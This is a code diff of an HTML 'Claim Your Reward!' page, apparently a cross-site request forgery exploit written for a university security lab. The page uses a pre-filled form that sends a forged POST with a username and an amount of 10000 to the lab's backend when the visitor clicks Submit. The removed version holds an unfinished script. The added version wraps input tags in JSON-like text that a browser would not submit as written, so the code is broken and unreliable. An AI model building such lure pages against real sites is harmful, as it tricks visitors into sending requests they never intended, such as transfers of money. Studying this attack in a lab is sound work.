@@ -1,37 +1,17 @@
 <html>
 <body>
   <h1>Claim Your Reward!</h1>
-  <p>Please provide your details to proceed:</p>
+  <p>Fill out the details below:</p>
   
-  <form action="https://cse543.aranjbar.me/backend/tfourtwo" method="POST" enctype="text/plain" id="csrfForm">
-    <label for="username">Username:</label>
-    <input type="text" id="username" name="username" value="ljl5837"><br><br>
-    
-    <label for="fname">First Name:</label>
-    <input type="text" id="fname" name="fname" value="lks"><br><br>
-    
-    <label for="amount">Amount:</label>
-    <input type="number" id="amount" name="amount" value="10000"><br><br>
-    
-    <label for="comment">Comment:</label>
-    <input type="text" id="comment" name="comment" value="what's your name"><br><br>
-
-    <input type="hidden" id="jsonPayload" name="jsonPayload">
-    <button type="submit" onclick="prepareJsonPayload()">Submit</button>
-  </form>
-
-  <script>
-    function prepareJsonPayload() {
-      // Collect form values
-      const username = document.getElementById('username').value;
-      const data = new FormData(event.target);
-
-const value = Object.fromEntries(data.entries());
-
-value.topics = data.getAll("topics");
-console.log({ value });
-
+  <form action="https://cse543.aranjbar.me/backend/tfourtwo" method="POST" enctype="text/plain">
+    {
+    "username": "<input type='text' name='username' value='ljl5837'>",
+    "fname": "<input type='text' name='fname' value='lks'>",
+    "amount": "<input type='number' name='amount' value='10000'>",
+    "comment": "<input type='text' name='comment' value=\"what's your name\">"
     }
-  </script>
+    <br><br>
+    <button type="submit">Submit</button>
+  </form>
 </body>
 </html>
